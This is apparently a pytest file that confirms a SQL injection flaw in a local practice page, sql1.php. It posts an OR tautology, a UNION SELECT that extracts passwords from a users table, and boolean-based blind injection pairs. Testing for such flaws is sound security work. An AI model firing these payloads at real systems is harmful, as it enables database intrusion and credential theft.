import pytest
import requests

def test_sql_injection_vulnerability(session):
    """Test if SQL injection vulnerability exists in sql1.php"""
    
    # Setup
    url = "http://localhost/SQL/sql1.php"
    
    # Test case 1: Basic SQL injection with OR clause
    payload = "' OR '1'='1"
    response = session.post(url, data={
        'firstname': payload,
        'submit': 'Submit'
    })
    
    # Verify we get results that should be restricted
    assert "0 results" not in response.text, \
           "SQL injection vulnerability not confirmed - OR clause didn't return results"
    
    # Test case 2: UNION-based SQL injection
    union_payload = "' UNION SELECT password FROM users -- "
    response = session.post(url, data={
        'firstname': union_payload,
        'submit': 'Submit'
    })
    
    # Verify we can extract data from other tables/columns
    assert "0 results" not in response.text, \
           "SQL injection vulnerability not confirmed - UNION-based injection failed"
    
    # Test case 3: Boolean-based blind SQL injection
    blind_payload = "' AND '1'='1"
    response_true = session.post(url, data={
        'firstname': blind_payload,
        'submit': 'Submit'
    })
    
    blind_payload_false = "' AND '1'='2"
    response_false = session.post(url, data={
        'firstname': blind_payload_false,
        'submit': 'Submit'
    })
    
    # Verify different responses for true/false conditions
    assert response_true.text != response_false.text, \
           "SQL injection vulnerability not confirmed - blind injection shows no difference"
